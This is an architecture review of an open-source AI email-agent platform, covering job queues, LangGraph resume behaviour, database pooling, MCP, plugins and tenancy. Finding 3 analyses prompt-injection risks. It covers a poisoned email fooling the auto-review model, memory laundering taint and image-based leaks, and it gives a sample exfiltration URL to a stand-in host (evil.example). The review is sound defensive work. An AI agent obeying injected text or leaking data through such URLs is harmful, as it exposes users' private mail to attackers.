# Architecture review, 2026-11-12

**What was reviewed:** [agents-and-plugins.md](agents-and-plugins.md) (the design for runs, the tool pipeline, approvals, triggers, memory and plugins), [high-level.md](high-level.md), ADRs 0001–0003, the code in `apps/api`, and the repo layout.
**What was asked:** will this scale, is it shaped right for an open-source project, and what is wrong or missing.
**What changed because of it:** [agents-and-plugins.md](agents-and-plugins.md) was revised in place (list at the end), and [repo-structure.md](repo-structure.md) is new. No application code was touched.
**Reading time:** about 20 minutes. Findings are ranked: the first five are the ones that would hurt most.
**Status:** a snapshot of 2026-11-12. The owner accepted every recommendation the same day ([ADR 0004](../adr/0004-agent-runtime-and-safety.md), [0005](../adr/0005-job-queue-and-scaling.md), [0006](../adr/0006-repo-structure-plugins-and-project.md)). Since then CI, the contributor files and the glossary fixes in finding 16 are done. Where this file and an ADR differ, the ADR wins.

## The verdict in five lines

1. **The core ideas are right** and match how the best projects do it: one pipeline for every action, risk declared by the plugin, approvals that fail closed, Postgres for everything.
2. **The design said *what* happens but not *who carries it*.** There was no job queue, no way for live updates to cross from one process to another, and no plan for database connections. Those are the parts that decide whether it scales.
3. **Two claims were stronger than the truth.** "A retry never sends an email twice" and "the run pauses safely" both depend on details of LangGraph the design didn't handle. Fixable, and now fixed on paper.
4. **Prompt-injection defence leaned on the weakest tool** (telling the model that text is "data") and had three real holes. The structure to close them was already there (taint); it needed to be applied more strictly.
5. **For open source, the code is ahead of the project.** There is no CI, no way to self-host, no contributor or security files, and no place for plugins to live yet. All cheap to add; see [repo-structure.md](repo-structure.md).

## What's already good

Keep these. They are the hard decisions and they were made well.

- **One door for every action.** The five-step pipeline with risk classes in the manifest is the same idea behind Home Assistant integrations and Dify plugins, and it is the reason integration #200 costs the same as #2.
- **Fail closed.** No answer = no. Expired = no. `credential` and `destructive` never automatic.
- **The decision trace.** Storing *why* a call was allowed is rare and valuable: it is the audit log, the debugging tool and the test oracle at once.
- **The approved-arguments hash.** What a person approved is exactly what runs.
- **Run-level taint.** It is the same shape as Meta's "Rule of Two" and Simon Willison's "lethal trifecta", arrived at independently. Most agent products have nothing like it.
- **Postgres only.** Compare the default self-host set-ups: Langflow 2 services, LibreChat 6, Onyx 15, Dify 47. Staying near the bottom of that list is a feature.
- **Not `pip install`-ing at runtime**, and **snapshotting MCP tool lists.** Both are ahead of common practice.
- **The backend code.** Layers are clean, services don't know about HTTP, sessions are hashed, non-members get 404, mypy is strict, 48 tests pass. It is a good base to hang a worker on.
- **"Copy the ideas, not the code" from DeepSeek Harness.** Correct call for a multi-tenant server.
- **The build order in small steps.** Kept; one step was added at the front and one in the middle.

## Findings, most important first

Each finding: what is wrong or missing → why it matters → what to do → where the fact comes from. "Changed in §N" points at the revised [agents-and-plugins.md](agents-and-plugins.md).

### 1. A paused or retried run can repeat its side effects

**What's wrong.** Two things.

- When LangGraph resumes a run, **the node that called `interrupt()` runs again from its first line.** The design drew the pipeline as one `tool_pipeline` node, so on resume "validate → policy → create approval request" would all run a second time.
- The design promised "an idempotency key (`run_id:step`), so a retry never sends an email twice". A key only helps if the other side honours it. **Gmail's send has no such key.** If the worker dies after Gmail accepted the mail but before we saved the result, a blind retry sends it again.

**Why it matters.** A bot that double-sends email, or double-pays, loses a user's trust once and for all. This is the single most damaging class of bug for this product, and it appears exactly when the system is under load or being deployed.

**Do this.**
- Split the pipeline into separate nodes: `prepare_call` → `approval_gate` (contains *only* `interrupt()`) → `execute_tool` → `post_execute`. Make every node safe to run twice (inserts keyed by `run_id` + `tool_call_id`).
- Add a `tool_executions` table: write `started` before calling the plugin, `succeeded` after. On a retry: `succeeded` → reuse the saved result; still `started` → for `read` tools run again, for anything risky stop and ask a person (new run state `needs_attention`). Tools declare `idempotent: true/false`.
- Run the graph with `durability="sync"` so a step is saved before the next begins.
- Test it: kill the worker in the middle of the fake send and assert exactly one send.

**Source.** [LangGraph interrupts](https://docs.langchain.com/oss/python/langgraph/interrupts) ("the node restarts from the beginning"; side effects before `interrupt()` should be idempotent), [functional API on tasks](https://docs.langchain.com/oss/python/langgraph/functional-api), [durability modes](https://reference.langchain.com/python/langgraph/types/Durability).
**Changed in** §4, §4.1, §6, §13, diagrams 03, 04, 05, 11.

### 2. There is no job queue, so "split the worker out later" has no path

**What's wrong.** The design said: "today the worker can run inside the API process; when load grows it moves to its own process, with a queue between them". But no queue was chosen, and the first version would call the graph straight from the request. That means:

- A restart or deploy **silently loses every run in flight** (the checkpoint exists, but nothing knows to pick it up again).
- Nothing enforces "one run at a time" except hope.
- Nothing fires approval expiry, routines or inbox checks.
- Two people clicking Approve at once can resume the same run twice. Open-source LangGraph has **no guard for this**; the feature ("double texting") exists only in LangChain's paid platform, whose server is under the Elastic licence and so is not usable here.
- Moving to a separate worker later would be a rewrite of how runs start.

**Why it matters.** This is the difference between a demo and a service. It is also the cheapest moment to decide: nothing is built yet.

**Do this.** Adopt **procrastinate** now, and use it from the very first "bots reply" step, with the worker running *inside* the API process at first.

| Option | Licence | Needs besides Postgres | Verdict |
|---|---|---|---|
| **procrastinate** | MIT | nothing | **Recommended.** Async, scheduled jobs, retries, and **locks** (jobs sharing a lock run one at a time, in order), which is precisely "one run per chat". Uses psycopg, which we already have. |
| pgqueuer | MIT | nothing | Good second choice. Younger; no ordered per-key lock out of the box. |
| DBOS Transact (Python) | MIT library | nothing | It was the plan in the TypeScript era. But it is a second durable-workflow engine next to LangGraph's checkpointer, which means two things both trying to own "resume", and its multi-worker control plane (Conductor) is proprietary. |
| Hatchet | MIT | its own server | Another service to run; its Postgres-only "Lite" mode is described as for development and low volume. |
| Temporal | MIT | its own cluster | Excellent and far too heavy for one docker compose. |
| Celery, arq, Taskiq, SAQ | BSD / MIT | Redis or RabbitMQ (SAQ can use Postgres) | A second required service; arq is in maintenance-only mode. |

Rules that make it work:
- The API writes the message, the `runs` row and the job **in one transaction**.
- The API and worker **never call each other**; they share only Postgres. Then `WORKER_MODE=embedded` → `separate` is a setting.
- Approvals are decided with one atomic `UPDATE … WHERE status = 'pending'`; only the winner enqueues the resume job.
- Lock = the chat for chat runs, the connection for trigger runs. Plus caps per bot and per organization.

**Source.** [procrastinate](https://github.com/procrastinate-org/procrastinate), [its locks](https://procrastinate.readthedocs.io/en/stable/howto/advanced/queueing_locks.html), [pgqueuer](https://github.com/janbjorge/pgqueuer), [DBOS](https://github.com/dbos-inc/dbos-transact-py), [Hatchet Lite](https://docs.hatchet.run/self-hosting/hatchet-lite), [arq maintenance notice](https://github.com/python-arq/arq/issues/510), [LangGraph double texting is platform-only](https://docs.langchain.com/langsmith/double-texting), [langgraph-api licence](https://pypi.org/project/langgraph-api/).
**Changed in** §1, §6, new §12, §14, diagrams 01, 05, 11, 13.

### 3. Prompt-injection defences have three holes, and one layer is trusted too much

**What's wrong.**
- **(a) The auto-review model can approve.** The answerer chain is "saved rules → auto-review model → person". That model reads the same poisoned email as the bot. An attack that fools one will often fool both. As written, it could approve the very call taint was meant to stop.
- **(b) "read" is assumed safe.** A tool that fetches any URL can leak data in the address itself (`https://evil.example/?q=<your invoice>`). The policy table makes every `read` automatic at every level.
- **(c) Memory launders taint.** A fact extracted from a malicious email is saved by mem0, then recalled next week into a clean run as trusted context.
- **(d) The chat can leak.** If bot replies render images or auto-preview links, an injected reply can send data out through an image address without any tool call.
- **Over-trust:** "outside text is wrapped and labelled as data" was listed first among the defences. Research in 2025 broke twelve such defences with over 90% success. It is worth doing and worth nothing as a guarantee.

**Also say this out loud:** an inbox bot always reads outside text and always has private data. So under this (correct) taint rule, **"Autonomous within limits" will still ask before every send that follows reading an email.** That isn't a bug, but the docs and UI never said it, and users will think the setting is broken.

**Why it matters.** This product's whole promise is "safe to leave running in your inbox". OWASP ranks prompt injection first and "excessive agency" sixth among LLM risks.

**Do this.**
- When the run is tainted, the auto-review model may only **deny or escalate to a person**, never approve.
- Add `egress: fixed | open` to every tool. Tainted run + `open` egress = treated as `external-send`, even for reads.
- Store taint on memories; recalling a tainted memory taints the run. Pass taint to child runs on handoff.
- In the web app: no remote images and no automatic link previews in bot output, unless the address is on an allow list.
- Keep run-level taint for v1 (simple, safe). Note per-value tracking (CaMeL-style) as the later upgrade that would reduce approval cards.
- Add an **injection test file**: emails that try known tricks, each asserted to end in `ask` or `deny`. The policy is a pure function, so most of these tests need no model.
- Fight approval fatigue with narrow saved rules and good highlighting, not with auto-approval.

**Source.** [The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/), [Meta: Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/), [The Attacker Moves Second](https://arxiv.org/abs/2510.09023), [CaMeL](https://arxiv.org/abs/2503.18813), [Design patterns for securing LLM agents](https://arxiv.org/abs/2506.08837), [OWASP LLM Top 10 (2025)](https://genai.owasp.org/llm-top-10/), [OWASP Agentic Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/), [image exfiltration write-up](https://simonwillison.net/2024/Jun/16/github-copilot-chat-prompt-injection/).
**Changed in** §5 (approval answerers, the taint section), §8, §9, §10.1.

### 4. Live updates only work while there is exactly one process

**What's wrong.** "call_model streams tokens to the chat" has no mechanism once the worker and the API are different processes, or once there are two API copies and your browser is connected to the other one. There was also no answer to "what did I miss while my connection dropped?", and ADR 0001 requires everyone in a group chat to see the same live reply.

**Why it matters.** Streaming is the first thing users see, and it is the first thing that breaks at two servers. Retro-fitting replay is painful.

**Do this.**
- A small **event bus** interface with three implementations: in-memory (laptop), Postgres `LISTEN/NOTIFY` (default for servers), Valkey (optional, later).
- Two kinds of event: **token batches** (about every 100 ms, never saved) and **durable events** saved in a `run_events` table with a growing id. The bus only carries the id.
- SSE sends that id; browsers send `Last-Event-ID` back on reconnect by themselves; the API replays from the table.
- **One stream per person per organization**, not one per chat.
- Don't put tokens one-by-one, or anything large, through `NOTIFY`: payloads are capped near 8,000 bytes, each listener needs a dedicated direct connection, and heavy NOTIFY use has been measured to slow all commits.
- If a broker is ever added, it is **Valkey** (BSD). Redis's current licences (RSAL / SSPL / AGPL) are on our "needs an ADR" list.

**Source.** [PostgreSQL NOTIFY](https://www.postgresql.org/docs/current/sql-notify.html), [Recall.ai: LISTEN/NOTIFY does not scale](https://www.recall.ai/blog/postgres-listen-notify-does-not-scale), [SSE in the HTML standard](https://html.spec.whatwg.org/multipage/server-sent-events.html), [resume pattern](https://ably.com/blog/resume-tokens-last-event-id-llm-streaming-reconnection), [Redis on Valkey and licences](https://redis.io/blog/what-is-valkey/).
**Changed in** new §12.3, §13, diagrams 01, 15.

### 5. Database connections: three traps, and the tests can't see any of them

**What's wrong.**
- **Pooled vs direct.** Neon's `-pooler` address (and any PgBouncer in transaction mode) **drops `LISTEN`, session `SET` and session locks**. The queue's wake-ups, the event bus and migrations need a direct address. Today there is one `DATABASE_URL`.
- **Prepared statements.** Behind a pooler, psycopg should run with `prepare_threshold=None` (unless the pooler is new enough and configured for it). Reports say LangGraph's `from_conn_string` helper turns preparing *on*; build the pool ourselves. *(The second half is from forum posts, not official docs: check when building.)*
- **The checkpointer needs its own pool** (`autocommit=True`, `row_factory=dict_row`). It can't share SQLAlchemy's.
- **Migrations run inside `pnpm start:api`.** With two API copies, two migrations race.
- **All 48 tests run on SQLite.** The queue, checkpoints, `SKIP LOCKED`, advisory locks, pgvector, JSONB operators and row-level security don't exist there. Every risky piece of the agent runtime would be untested by the current set-up.
- **Neon scale-to-zero** kills idle listeners and loses notifications.

**Why it matters.** These fail in production, not on a laptop, and they fail as "random" hangs and missing updates that are miserable to debug.

**Do this.** Two settings, `DATABASE_URL` (may be pooled) and `DATABASE_URL_DIRECT`. Three pools, sized on purpose. A one-shot `migrate` step that also creates the LangGraph and queue tables. Postgres for tests of anything touching the runtime (a compose file locally, a service container in CI), keeping SQLite for pure logic. Treat every notification as a hint and always catch up from a table.

**Source.** [Neon connection pooling](https://neon.com/docs/connect/connection-pooling), [PgBouncer feature table](https://www.pgbouncer.org/features.html), [psycopg prepared statements](https://www.psycopg.org/psycopg3/docs/advanced/prepare.html), [checkpoint-postgres README](https://github.com/langchain-ai/langgraph/blob/main/libs/checkpoint-postgres/README.md), [forum report on the pool](https://forum.langchain.com/t/postgres-checkpointer-error-with-the-pool/1195), [Neon on LISTEN/NOTIFY](https://neon.com/guides/pub-sub-listen-notify), [procrastinate connections](https://procrastinate.readthedocs.io/en/main/howto/production/connections.html).
**Changed in** new §12.4, §14 step 0.

### 6. "One run at a time per bot" is the wrong unit, and runs have no limits

**What's wrong.**
- One slow job blocks a shared bot for the whole team. And if a run waiting days for approval counted as "the one run", the bot would be frozen. The design didn't say.
- No cap on steps, tool calls, time or cost per run. LangGraph's built-in `recursion_limit` used to be 25; **it is now about 10,000**, so it is no longer a safety net.
- A model can return several tool calls in one reply. "One at a time" needs an explicit loop, and every call must get a result back or the provider rejects the next request.
- Budgets were mentioned but had no table or check point. Rate limits kept in process memory stop working with two API copies.

**Do this.** Serialise per **chat** (and per **connection** for triggers); cap per bot (default 2) and per organization; waiting runs hold nothing. Explicit limits per run with defaults. A `usage_events` table, checked before each model call. Rate limits counted in Postgres.

**Source.** [LangGraph graph API (recursion limit)](https://docs.langchain.com/oss/python/langgraph/graph-api).
**Changed in** §4 (router), new §4.2, "Run states", §12.5, §13.

### 7. Runs that sleep for days will meet new code, and checkpoints pile up

**What's wrong.** LangGraph applies the newest graph to every paused run; there is no version pinning. Rename a node while 300 runs are paused on it and they can't resume. Separately, a checkpoint is written every step and nothing deletes them; and checkpoints hold email text in the clear, with no `org_id`.

**Do this.** Store `graph_version` on `runs`. Only add nodes and optional state fields while runs are paused; retire old nodes after they drain. A daily job deletes checkpoints of finished runs (`adelete_thread`); `run_steps` is the permanent record. Keep state small (references, not blobs). Reach checkpoints only through a `runs` row; delete them with the organization; never put tokens in state.

**Source.** [LangGraph backward compatibility](https://docs.langchain.com/oss/python/langgraph/backward-compatibility), [checkpointers](https://docs.langchain.com/oss/python/langgraph/checkpointers), [AsyncPostgresSaver reference](https://reference.langchain.com/python/langgraph.checkpoint.postgres/aio/AsyncPostgresSaver).
**Changed in** §4 (the "two stores" note), §6, §12.4.

### 8. The MCP plan is built on a package and a spec that have both moved

**What's wrong.**
- The design names `langchain-mcp-adapters` / `MultiServerMCPClient`. That package is **no longer maintained**; its README points to `langchain[mcp]`.
- The spec's current revision is **2026-07-28**: stateless (no session handshake), OAuth 2.1 with the server as a resource server, old HTTP+SSE transport and dynamic client registration deprecated.
- MCP tool "hints" (read-only, destructive) must be treated as **untrusted** per the spec. The design didn't say where an MCP tool's risk class comes from.
- "Snapshot the tool list" is right but must include **descriptions and schemas** (they are read by the model, so they are an injection path), and tokens must be per person per server, never passed through.

**Do this.** Default every MCP tool to `external-send` + `egress: open`; an admin lowers it deliberately. Hash name + description + schema; pause on change. Prefix tool names. Treat all MCP output as tainted. Block private and metadata addresses for MCP URLs, HTTP plugins and webhooks (SSRF). Re-check package and spec on the day this step starts.

**Source.** [MCP changelog 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/changelog), [authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization), [tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools), [security best practices](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices), [tool poisoning (Invariant Labs)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks), [langchain-mcp-adapters](https://github.com/langchain-ai/langchain-mcp-adapters), [LangChain MCP auth](https://docs.langchain.com/oss/python/langchain/mcp/auth), [OWASP SSRF](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
**Changed in** §10.2, new §10.5, diagram 09.

### 9. The plugin platform: five smaller problems

| # | What's wrong | Do this |
|---|---|---|
| a | **Entry points load anything installed.** Any Python package can register in `botdesk.plugins`; loading it runs its code in our server. | Load only ids named in `BOTDESK_PLUGINS`. |
| b | **Two sources of truth.** A hand-written `manifest.json` *and* Python classes both state tool names, schemas and risk. They will drift, and risk is the thing that must not. | Declare in code (Pydantic models); **generate** the manifest; CI fails on a difference. |
| c | **`gmail.send_email` is not a legal tool name** for the big model providers (letters, digits, `_`, `-` only). | Keep the dotted id inside BotDesk; show the model `gmail__send_email`. |
| d | **"`register` returns an undo" is oversold** ("the most useful idea from dsh"). In a shared server the registry is built once per process; whether Acme has Gmail is a database row. Nothing is ever undone per organization. | Drop it from the contract; keep `unregister` for tests. |
| e | **Five tiers is three too many for v1**, and T2 (sandboxed third-party Python) is a product in itself. There is no safe in-process Python sandbox; Dify needed a separate Go daemon for this. | v1 = **T0 built-in + T3 MCP**. T1 HTTP next. T2 only if someone truly needs it; MCP already lets outsiders add tools without their code running here. |

Also: the manifest's `permissions.egress` is unenforceable for in-process plugins (say so); the SDK must be a **separate package** so plugins never import `apps/api` (see [repo-structure.md](repo-structure.md)); with many plugins, show each bot only its enabled tools.

### 10. Gmail has a business cost the docs never mention

**What's wrong.** Reading or modifying mail needs Google's **restricted** scopes. A public hosted app must pass Google's verification **and a yearly paid third-party security assessment (CASA)**. Left in "Testing", an app is limited to 100 users and its refresh tokens die every 7 days. Gmail push needs a Google Cloud Pub/Sub topic and a `watch` renewed at least weekly; the design drew push as the default.

**Why it matters.** ADR 0001 says "self-hosted AND hosted SaaS" and ADR 0002 says "Gmail first". Together they put a multi-week, paid compliance step between the code and the first public hosted user. It doesn't block building; it must be on the plan.

**Do this.** v1: each self-hoster brings their own Google OAuth client (Workspace "Internal" skips verification); document it step by step. Polling is the default trigger, push the upgrade. Ask for the fewest scopes that work. Start the verification process when hosted launch is about two months out.

**Source.** [Gmail scopes](https://developers.google.com/workspace/gmail/api/auth/scopes), [restricted scope assessment](https://support.google.com/cloud/answer/13465431), [testing status limits](https://support.google.com/cloud/answer/15549945), [verification exemptions](https://support.google.com/cloud/answer/13464323), [Gmail push](https://developers.google.com/workspace/gmail/api/guides/push).
**Changed in** §7, diagram 06.

### 11. Tenancy relies on every query remembering its `WHERE`

**What's wrong.** Isolation today is `OrgAccess` on routes plus `org_id` filters in services: correct, and one forgotten filter away from a leak. The worker adds new ways in (jobs, triggers, memory) that don't pass through `OrgAccess`. mem0 isolation is only a `user_id` filter. Memories were scoped to organization + bot, so something learned in one member's private DM could surface in another member's chat.

**Do this.** `org_id` on every new table and in every job's arguments. A tenancy test suite (A can't see B) for routes *and* jobs. One `MemoryService` that sets the scope itself; add the member to the scope for DM memories. Add Postgres row-level security before the hosted service opens: non-owner app role, `FORCE ROW LEVEL SECURITY`, `set_config('app.current_org', …, true)` per transaction (transaction-scoped, so safe with a pooler).

**Source.** [PostgreSQL row security](https://www.postgresql.org/docs/current/ddl-rowsecurity.html), [PgBouncer and session state](https://www.pgbouncer.org/features.html).
**Changed in** §9, new §12.5.

### 12. Secrets were one word ("encrypted")

**Do this.** Envelope encryption: each token encrypted with a data key, data keys wrapped by a master key from the environment; a key list so keys can be rotated; the key id stored on the row. Same for model keys. Tools receive a ready-made HTTP client, never the token. Tokens never enter run state.

**Source.** [Envelope encryption](https://docs.cloud.google.com/kms/docs/envelope-encryption), [Fernet / MultiFernet](https://cryptography.io/en/latest/fernet/).
**Changed in** §10.1 (`ToolContext`), §10.3.

### 13. No plan for seeing what's happening, or for knowing a change made bots worse

**Do this.** `run_steps` is the built-in trace (free for every self-hoster). JSON logs with `org_id` / `run_id`. OpenTelemetry behind one setting. LLM tracing optional by environment variable: Langfuse (MIT core, but its self-host needs ClickHouse, Redis and S3, so never in our default compose) or LangSmith (proprietary, hosted). Don't bundle Arize Phoenix (Elastic licence). Three kinds of eval: policy unit tests, the injection file, golden conversations before releases.

**Source.** [Langfuse](https://github.com/langfuse/langfuse) and [its self-hosting needs](https://langfuse.com/self-hosting), [LangSmith self-hosting](https://docs.langchain.com/langsmith/self-hosted), [Phoenix licence](https://github.com/Arize-ai/phoenix), [OpenLLMetry](https://github.com/traceloop/openllmetry), [openevals](https://github.com/langchain-ai/openevals), [agentevals](https://github.com/langchain-ai/agentevals).
**Changed in** new §12.6.

### 14. Memory costs more and tells more than the design says

mem0 makes at least one extra model call on every save, and its **telemetry is on by default** (sent to PostHog) unless `MEM0_TELEMETRY=False`. The design said "switched off" without saying how. **Do this:** set it in code and compose; run saves as low-priority jobs with their own budget line; a mem0 failure must never fail a run; use `AsyncMemory`.

**Source.** [mem0 add](https://docs.mem0.ai/core-concepts/memory-operations/add), [telemetry.py](https://github.com/mem0ai/mem0/blob/main/mem0/memory/telemetry.py), [AsyncMemory](https://docs.mem0.ai/open-source/features/async-memory).
**Changed in** §9.

### 15. The repo isn't yet an open-source *project*

The root README lists `packages/*` (UI, database, core logic) that don't exist and probably shouldn't yet. None of this is hard; all of it is in [repo-structure.md](repo-structure.md), with the order to add it.
